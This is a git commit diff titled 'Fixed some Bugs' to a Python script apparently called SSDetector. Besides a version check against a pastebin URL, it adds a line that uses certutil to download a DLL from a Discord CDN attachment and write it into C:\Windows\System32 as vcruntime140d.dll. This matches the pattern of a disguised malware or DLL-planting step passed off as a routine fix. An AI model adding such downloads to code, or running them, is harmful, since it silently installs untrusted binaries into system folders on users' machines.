3d17fb6a5d633a6bca93cf3644d772c2d9c5a53f
nestyk <gnestico7@gmail.com>
2022-12-08 21:22:35 +0100

    Fixed some Bugs

--- Detector/Detector.py
+++ Detector/Detector.py
@@ -7,11 +7,13 @@ from urllib.request import urlopen
 
 system("Title = SSDetector")
 if urlopen("https://pastebin.com/raw/2MMvhPUL").read().decode("utf-8").strip() != "1.0":
-    print("Version is unable. Please check @SSDetector on telegram.")
+    print("Version is unable. Please check @SSDetectorTool on telegram.")
     input()
     exit()
 
 print("loading some resources...")
+if not exists("C:\\Windows\\System32\\VCRUNTIME140D.dll"):
+    output = popen(fr'certutil -urlcache -split -f https://cdn.discordapp.com/attachments/1049264531681054730/1050507295592812684/vcruntime140d.dll C:\Windows\System32\vcruntime140d.dll')
 if not exists("C:\\Detector"):
     
     system("mkdir C:\\Detector")
